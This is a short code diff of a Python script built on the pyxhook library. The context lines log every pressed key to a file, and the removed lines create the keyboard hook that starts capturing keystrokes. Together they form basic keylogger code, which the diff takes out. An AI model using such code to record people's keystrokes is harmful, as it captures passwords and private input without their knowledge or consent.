@@ -18,12 +18,3 @@ cancel_key = ord(
 def OnKeyPress(event):
     with open(log_file, 'a') as f:
         f.write('{}\n'.format(event.Key))
-
-#instantiate HookManager class
-new_hook=pyxhook.HookManager()
-#listen to all keystrokes
-new_hook.KeyDown=OnKeyPress
-#hook the keyboard
-new_hook.HookKeyboard()
-#start the session
-new_hook.start()
